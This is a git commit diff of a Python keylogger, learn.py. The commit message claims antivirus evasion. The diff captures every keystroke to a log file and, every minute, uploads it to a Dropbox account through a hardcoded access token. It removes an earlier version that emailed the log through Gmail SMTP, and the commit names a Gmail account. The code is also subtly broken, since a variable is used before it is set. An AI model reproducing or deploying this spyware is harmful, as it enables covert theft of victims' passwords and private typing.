f2edcdd4d4ab29297f5544692df311258660e9ac
ManishVSC <46258694+ManishVSC@users.noreply.github.com>
2018-12-31 10:50:00 -0800

    New version
    This version is able to bypass anti-virus and have new exe plus py file with dropbox upload function.
    Dropbox id is michealray54213@gmail.com

--- learn.py
+++ learn.py
@@ -1,3 +1,4 @@
+import dropbox
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -9,68 +10,55 @@ import threading
 import logging
 
 
+logging.basicConfig(filename=(log_dir + "test.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')
 
+def on_press(Key): 
+    logging.info(str(Key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
 
 
 
 log_dir = ""
-def email_send():
-	subject = 'Logs'
+
+class TransferData:
+    def __init__(self, access_token):
+        self.access_token = 'RANt4BUePOAAAAAAAAAACdZEolhDaXGoRiMSD_tAYemEfRRW9uNz9qad2UGf34VS'
+
+    def upload_file(self, file_from, file_to):
+        """upload a file to Dropbox using API v2
+        """
+        dbx = dropbox.Dropbox(self.access_token)
+
+        with open(file_from, 'rb') as f:
+            dbx.files_upload(f.read(), file_to)
+
+def main():
+    access_token = 'RANt4BUePOAAAAAAAAAACdZEolhDaXGoRiMSD_tAYemEfRRW9uNz9qad2UGf34VS'
+    transferData = TransferData(access_token)
+
+    file_from = 'test.txt'
+    file_to = '/test_dropbox/test.txt'  # The full path to upload the file to, including the file name
+
+    # API v2
+    transferData.upload_file(file_from, file_to)
 
 
-	msg = MIMEMultipart()
-	msg['From'] = 'michaelray54213@gmail.com'
-	msg['To'] = 'michaelray54213@gmail.com'
-	msg['subject'] = subject
-
-	body = 'Sending this from python'
-	msg.attach(MIMEText(body,'plain'))
-
-	filename='key_log.txt'
-	attachment = open(filename, 'rb')
-
-	part = MIMEBase('application', 'octet-stream')
-	part.set_payload((attachment).read())
-	encoders.encode_base64(part)
-	part.add_header('Content-Disposition', "attachment; filename= "+filename)
-
-	msg.attach(part)
-
-
-
-	text = msg.as_string()
-
-	server = smtplib.SMTP('smtp.gmail.com', 587)
-	server.starttls()
-	server.login('michaelray54213@gmail.com', '*********')
-
-
-	server.sendmail('michaelray54213@gmail.com', 'michaelray54213@gmail.com', text)
-	server.quit()
 
 
 def wuf ():
     global timer
 
-    email_send()
+    if __name__ == '__main__':
+        main()
+    
     time.sleep(1)
     timer = threading.Timer(60, wuf)
     timer.start()
 
 timer = threading.Timer(60, wuf)
 timer.start()
-
-logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')
-
-def on_press(Key): 
-	logging.info(str(Key))
-
-with Listener(on_press=on_press) as listener:
-	listener.join()
-	
-
-
-
 
 
 
